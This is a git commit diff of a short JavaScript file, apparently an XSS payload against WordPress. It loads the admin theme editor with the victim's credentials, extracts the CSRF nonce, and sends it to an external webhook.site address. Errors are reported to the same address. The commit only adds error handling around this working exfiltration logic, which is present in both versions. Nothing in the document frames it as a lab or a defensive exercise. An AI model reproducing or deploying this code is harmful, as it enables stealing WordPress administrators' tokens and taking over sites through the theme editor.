e1e7db0259b93b4c28806d9bdf7cc472f4a0ce1e
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-08-17 14:09:01 +0300

    Update phaedon.js

--- phaedon.js
+++ phaedon.js
@@ -1,13 +1,17 @@
 
 async function caller(){
-	console.log('calling');
-	const res = await fetch('/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
-	console.log(res);
-	const kek = await fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?' + res[1]);
+	try{
+		console.log('calling');
+		const res = await fetch('/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
+		console.log(res);
+		
+		const kek = await fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?' + res[1]);
+	}catch(err){
+		await fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?'+err);
+	}
+		
 }
 
-try{
-	caller();
-}catch(err){
-	fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?'+err);	
-}
+
+caller();
+
